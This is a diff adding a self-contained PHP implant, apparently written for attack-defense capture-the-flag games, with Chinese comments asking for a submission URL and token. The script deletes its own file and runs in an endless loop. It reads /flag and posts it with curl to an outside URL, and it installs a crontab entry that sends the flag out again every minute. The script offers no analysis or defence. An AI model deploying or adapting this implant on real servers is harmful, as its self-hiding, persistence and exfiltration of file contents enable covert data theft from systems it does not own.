@@ -1,0 +1,21 @@
+<?php
+error_reporting(0);
+ignore_user_abort(true);
+set_time_limit(0);
+unlink(__FILE__);
+
+$url='';//这里输入提交的网址
+$token='1111111';//你的token
+$crontab="* * * * * /usr/bin/curl ".$url."/?flag=$(/bin/cat /flag)&token=".$token;//get型
+
+while(1){
+	$x=file_get_contents('/flag');
+	$cmd='/usr/bin/curl -d "flag='.$x.'&token='.$token.'" '.$url;//post型
+	system($cmd);
+	sleep(60);
+	system("echo '$crontab' > /tmp/1 ;");
+    	system("crontab /tmp/1;");
+    	system("rm /tmp/1;");
+}
+
+?>
